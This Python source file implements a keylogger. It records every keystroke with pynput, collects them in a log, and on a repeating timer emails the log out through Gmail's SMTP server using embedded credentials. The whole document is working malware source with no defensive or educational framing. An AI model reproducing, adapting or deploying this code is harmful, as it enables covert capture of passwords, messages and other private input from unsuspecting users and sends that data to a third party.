import smtplib
import threading
import pynput.keyboard

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "[+] Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                current_key = " "
            else:
                current_key = " " + str(key)
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = "[+] Keylogger started"  
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except smtplib.SMTPAuthenticationError as e:
            print(f"Failed to authenticate with the email server: {e}")
        except smtplib.SMTPException as e:
            print(f"Failed to send email: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
